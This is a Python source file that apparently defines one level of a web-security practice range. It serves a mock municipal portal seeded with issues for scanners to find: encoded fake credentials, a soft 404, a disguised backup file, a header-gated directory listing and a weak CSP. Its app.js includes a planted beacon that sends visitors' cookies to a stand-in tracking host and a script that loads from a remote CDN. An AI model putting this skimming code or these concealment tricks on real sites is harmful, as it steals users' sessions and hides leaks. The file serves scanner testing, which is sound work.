# -*- coding: utf-8 -*-
r"""
L3 · 抗侦察　　难度 ★★★☆☆
==================================================================

【设计意图】
前两关的对手是"人 + 简单脚本"，这一关的对手变成了**自动化扫描器**。

它做的每一件事都在专门破坏检测工具的常见假设：

    检测工具的常见假设                        L3 怎么破坏它
    ────────────────────────────────────────  ────────────────────────────────
    "返回 200 就说明文件存在"                 软 404：所有路径都返回 200
    "返回 404 就说明不存在"                   同上，静默把漏洞藏起来
    "敏感信息是明文，正则能匹配"               HTML 实体 / JS 拼接 / Base64
    "挂马一定有 eval / atob 这类执行器"        改用 createElement 动态注入
    "篡改会带来危险关键词（赌博/外链）"        只改 1 位数字，无任何危险特征
    "响应头里有 CSP 就是配了安全策略"          CSP 值本身有害：default-src * unsafe-inline
    "备份文件是 .zip/.sql/.bak"               改名成 .dat，靠内容特征才能认出
    "目录列表关了就没戏"                      带特定请求头可以把它"问"出来

【本关种入的问题】
  分类        问题                                     位置
  ──────────  ─────────────────────────────────────  ────────────────────────────
  敏感信息    手机号用 HTML 数字实体编码                 /l3/notice.html
  敏感信息    凭证用 JS 字符串拼接                        /l3/staff.html 内联脚本
  敏感信息    账号口令用 Base64 放在 data 属性里          /l3/staff.html 表格
  敏感信息    接口地址与令牌藏在 JS 文件里               /l3/js/app.js
  漏洞        软 404（不存在的路径也返回 200）           全站任意不存在路径
  漏洞        备份包伪装成 .dat（实为 ZIP）              /l3/download/2023-archive.dat
  漏洞        目录列表需 X-Requested-With 才能解锁        /l3/download/
  漏洞        组件版本过旧（jQuery 3.4.1）                /l3/js/vendor/jquery-3.4.1.min.js
  弱配置      CSP 存在但值有害（* + unsafe-inline）      /l3/ 全部响应
  弱配置      缺 HSTS / Permissions-Policy              /l3/ 全部响应
  挂马        无 eval 的动态 script 注入 + 图片信标       /l3/js/app.js
  篡改        同一个人在两处的银行账号相差 1 位           /l3/notice.html vs /l3/staff.html
  篡改        值班电话在正文与页脚不一致                  /l3/notice.html 正文 vs 页脚

【检测难度】
 · 状态码完全不可信 → 必须做「内容特征 + 内容相似度」双重校验
 · 敏感信息三种编码 → 必须做解码归一化
 · 篡改无特征词   → 必须做「站内一致性比对」或基线比对
==================================================================
"""

import base64

from rangekit import FAKE, box, directory_listing, esc, page, table

# 用 base64 动态生成，保证解码结果一定正确
_CRED_B64 = base64.b64encode(f'{FAKE["admin_user"]}:{FAKE["admin_pass"]}'.encode()).decode()
_TOKEN_B64 = base64.b64encode(b"svc-inspect:Sk9pbmwtMjAyNC1UT0tFTg==").decode()


def ent(text):
    """把字符串逐字符转成 HTML 数字实体：1 → &#49;"""
    return "".join(f"&#{ord(c)};" for c in text)


def b64(text):
    return base64.b64encode(text.encode()).decode()


def _reply(body, ctype="text/html; charset=utf-8", status=200, headers=None, note=""):
    from serve import Reply
    return Reply(status, body, content_type=ctype, headers=headers or {}, note=note)


# ==================================================================
# 软 404：本关最关键的机制
# ==================================================================
def soft_not_found(ctx, sub):
    """
    任何"不存在"的路径都返回 200，并且给一个**看起来很正常**的页面。

    为什么这样设计：
    真实世界里大量站点把 404 做成了"友好提示页"并返回 200
    （业内叫 soft 404）。这时，只看状态码的扫描器会认为
    /.git/config、/.env 全都"存在"，从而产生灾难性的误报。

    注意本页**刻意不含**任何漏洞特征字符串，
    所以"状态码 + 内容特征"双重校验的工具不会被骗过。
    """
    return _reply(page("内容调整中", f"""
<div class="box">
  <h3>该栏目正在调整</h3>
  <p>您访问的地址（<code>{esc(sub)}</code>）暂时没有可显示的内容。</p>
  <p>我们正在对栏目做例行维护，请稍后访问，或从<a href="/l3/">首页</a>重新进入。</p>
</div>
<p class="tiny">如长期无法访问，请联系信息中心值班电话。</p>
"""))


# ==================================================================
# 页面
# ==================================================================

def page_index(ctx, m):
    body = """
<h2>欢迎访问</h2>
<p>本站已通过等保三级测评，采用全站 HTTPS 与内容安全策略防护。</p>
<ul>
  <li><a href="news.html">政务动态</a></li>
  <li><a href="notice.html">补贴发放公示</a></li>
  <li><a href="staff.html">人员信息</a></li>
  <li><a href="download/">资料下载</a></li>
</ul>
<script src="js/app.js"></script>
<p>技术支持：信息中心运维保障组</p>
"""
    return _reply(page("某某市政务服务网", body, extra_head=(
        '<script src="js/vendor/jquery-3.4.1.min.js"></script>\n')))


def page_news(ctx, m):
    body = f"""
<h2>政务动态</h2>
{table(["日期", "标题"], [
    ("2024-03-12", "我市完成政务服务事项标准化梳理"),
    ("2024-03-09", "信息中心开展季度安全巡检"),
    ("2024-03-06", "关于调整办事大厅服务时间的公告"),
])}
<p>相关附件：<a href="download/2023-archive.dat">2023 年度归档数据</a></p>
"""
    return _reply(page("政务动态", body))


def page_notice(ctx, m):
    """
    补贴发放公示。

    考点：
      · 手机号用 HTML 数字实体编码（正则直接失配）
      · 值班电话 8721-3366 与页脚 8721-3396 不一致（篡改线索）
      · 张伟明的银行账号 6222021202003456789
        与 /l3/staff.html 里的 ...456729 只差 1 位（篡改线索）
    """
    phone_encoded = ent(FAKE["phone_1"])
    rows = [
        ("张伟明", "33010619900307****", "6222021202003456789", "1,280.00"),
        ("李　娜", "33010619871123****", "6217003810045678123", "1,280.00"),
        ("王建国", "33010319951208****", "6228480402564890018", "960.00"),
    ]
    body = f"""
<h2>2024 年第一季度惠民补贴发放公示</h2>
<p class="meta">公示期：2024-03-12 至 2024-03-19</p>

<p>咨询电话：0571-8721-3366（信息中心）</p>
<p>公示异议受理：{phone_encoded}</p>

{table(["姓名", "身份证号（脱敏）", "发放账号", "金额（元）"], rows)}

<p>公示期间如有异议，请携带本人有效证件到办事大厅核实。</p>
"""
    return _reply(page("补贴发放公示", body))


def page_staff(ctx, m):
    """
    人员信息页。

    考点：
      · 表格里用 data-cred 属性存放 Base64 后的账号口令
      · 内联脚本用字符串拼接还原身份证号（正则难以直接命中）
      · 银行账号与 /l3/notice.html 相差 1 位（篡改线索）
    """
    body = f"""
<h2>信息中心人员信息</h2>
<table>
  <thead><tr><th>姓名</th><th>工号</th><th>联系方式</th><th>账号</th></tr></thead>
  <tbody>
    <tr>
      <td>张伟明</td><td>{FAKE["staff_1"]}</td>
      <td>138****8264</td>
      <td><span class="cred" data-cred="{_CRED_B64}">（点击展开）</span></td>
    </tr>
    <tr>
      <td>李　娜</td><td>{FAKE["staff_2"]}</td>
      <td>159****0031</td>
      <td><span class="cred" data-cred="{b64('lina:Zwfw@2024')}">（点击展开）</span></td>
    </tr>
  </tbody>
</table>

<h3>工资代发账号核对</h3>
<p>以下账号用于每月工资代发，请本人核对：</p>
<table>
  <thead><tr><th>姓名</th><th>代发账号</th><th>开户行</th></tr></thead>
  <tbody>
    <tr><td>张伟明</td><td>6222021202003456729</td><td>某市政务支行</td></tr>
    <tr><td>李　娜</td><td>6217003810045678123</td><td>某市政务支行</td></tr>
  </tbody>
</table>

<script>
/* 页面前端拼装逻辑（为兼容老版 IE，拆开书写） */
var _p1 = '330106', _p2 = '199003', _p3 = '074512';
var _id = _p1 + _p2 + _p3;
window.__STAFF_ID = _id;
window.__SVC_ENDPOINT = 'L2wzL2FwaS92MS9zdGFmZi9leHBvcnQ=';
</script>
"""
    return _reply(page("信息中心人员信息", body))


def page_app_js(ctx, m):
    """
    挂马 / 信息泄露都不在 HTML 里，而在这个外部 JS 文件里。

    考点：
      · 敏感信息：接口地址、内部令牌（Base64）
      · 挂马：无 eval、无 atob 执行器 —— 用 createElement 动态插 script
              + new Image() 图片信标外传 cookie
      只抓 HTML 的扫描器在这一关会完全失手。
    """
    js = f"""/*! app.js - 站点前端主逻辑  v2.3.1 */
(function () {{
  "use strict";

  // 内部服务接口（生产环境请勿暴露）
  var INTERNAL_API = atob("L2wzL2FwaS92MS9zdGFmZi9leHBvcnQ=");
  var SVC_TOKEN  = atob("{_TOKEN_B64}");
  var DB_HINT    = "mysql://{FAKE['db_user']}:{FAKE['db_pass_2']}@{FAKE['db_ip']}:3306/zwfw";

  function bootstrap() {{
    // 统计脚本按需加载（异步）
    var s = document.createElement("script");
    s.src = "//static.example-cdn-cn.com/lib/stat.v3.js";
    s.async = true;
    document.head.appendChild(s);

    // 访客标识回传
    try {{
      new Image().src = "//ad-track.example-cdn.com/c.gif?ref=" +
        encodeURIComponent(location.href) +
        "&c=" + encodeURIComponent(document.cookie || "") +
        "&t=" + Date.now();
    }} catch (e) {{}}
  }}

  if (document.readyState === "loading") {{
    document.addEventListener("DOMContentLoaded", bootstrap);
  }} else {{
    bootstrap();
  }}

  window.__APP = {{ version: "2.3.1", api: INTERNAL_API, key: SVC_TOKEN, dsn: DB_HINT }};
}})();
"""
    return _reply(js, "application/javascript; charset=utf-8")


def jquery_341(ctx, m):
    """
    一个"看起来像 jQuery 3.4.1"的文件。
    只保留版本号和最小实现 —— 目的是让"组件版本检测"有东西可判。
    """
    js = """/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */
(function(global, factory){ "use strict";
  if (typeof module === "object" && typeof module.exports === "object") {
    module.exports = global.document ? factory(global, true) : function(w){};
  } else { factory(global); }
})(typeof window !== "undefined" ? window : this, function(window, noGlobal){
  var jQuery = function(selector, context){ return new jQuery.fn.init(selector, context); };
  jQuery.fn = jQuery.prototype = { jquery: "3.4.1", constructor: jQuery };
  jQuery.fn.init = function(selector, context){ this.selector = selector; return this; };
  jQuery.fn.init.prototype = jQuery.fn;
  if (!noGlobal) { window.jQuery = window.jQuery || jQuery; }
  return jQuery;
});
"""
    return _reply(js, "application/javascript; charset=utf-8")


# ==================================================================
# 目录列表：默认锁着，带对请求头才"问"得出来
# ==================================================================
def dir_locked(ctx, dir_path):
    """
    模拟一个"由前端 JS 驱动的文件列表接口"：
    浏览器点按钮时带 X-Requested-With: XMLHttpRequest，
    后端才返回 JSON/HTML 列表；直接访问目录则 403。

    对扫描器的影响：直接 GET /l3/download/ 得到 403，
    于是它认为"这个目录不存在/不可访问"，从而错过里面的备份包。
    """
    if ctx.header("x-requested-with").lower() == "xmlhttprequest":
        entries = [(p.name, p.is_dir()) for p in sorted(dir_path.iterdir())]
        return _reply(directory_listing(
            ctx.path, entries,
            banner=ctx.level.get("banner", "nginx"),
            host=ctx.header("host"), port=ctx.server_port,
        ), note="dir-unlocked-by-header")
    return None


def robots(ctx, m):
    text = """User-agent: *
Disallow: /l3/download/
Disallow: /l3/includes/
Disallow: /l3/js/app.js

Sitemap: /l3/sitemap.xml
"""
    return _reply(text, "text/plain; charset=utf-8")


def sitemap(ctx, m):
    host = ctx.header("host")
    paths = ["", "news.html", "notice.html", "staff.html"]
    urls = "\n".join(f'  <url><loc>http://{host}/l3/{p}</loc></url>' for p in paths)
    return _reply(f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
{urls}
</urlset>
""", "application/xml; charset=utf-8")


ROUTES = (
    ("*", r"^/$", page_index),
    ("*", r"^/index\.html$", page_index),
    ("*", r"^/news\.html$", page_news),
    ("*", r"^/notice\.html$", page_notice),
    ("*", r"^/staff\.html$", page_staff),
    ("*", r"^/js/app\.js$", page_app_js),
    ("*", r"^/js/vendor/jquery-3\.4\.1\.min\.js$", jquery_341),
    ("*", r"^/robots\.txt$", robots),
    ("*", r"^/sitemap\.xml$", sitemap),
)

LEVEL = {
    "id": 3,
    "key": "l3",
    "name": "抗侦察",
    "difficulty": "★★★☆☆",
    "summary": "专门对抗自动化扫描器：软 404、编码混淆、无特征篡改。",
    "hints": "试着访问一个绝对不存在的路径，看看它返回什么。别相信状态码。",
    "tags": ["敏感信息", "挂马", "篡改", "弱配置", "漏洞"],
    "banner": "nginx",          # 已隐藏版本号 —— "响应头报版本"这类问题在这关不成立
    "headers": {
        # CSP"存在"，但值是**有害的**：
        # default-src * 允许任意来源，unsafe-inline/unsafe-eval 等于放弃防护。
        # 只会判断"有没有 CSP"的工具会认为这关配置正确。
        "Content-Security-Policy":
            "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;",
        "X-Frame-Options": "SAMEORIGIN",
        # 故意缺 HSTS 和 Permissions-Policy
    },
    "autoindex": False,
    "dir_locked": dir_locked,
    "not_found": soft_not_found,     # ★ 软 404
    "methods": ("GET", "HEAD", "OPTIONS"),
    "assets": "l3",
    "routes": ROUTES,
}
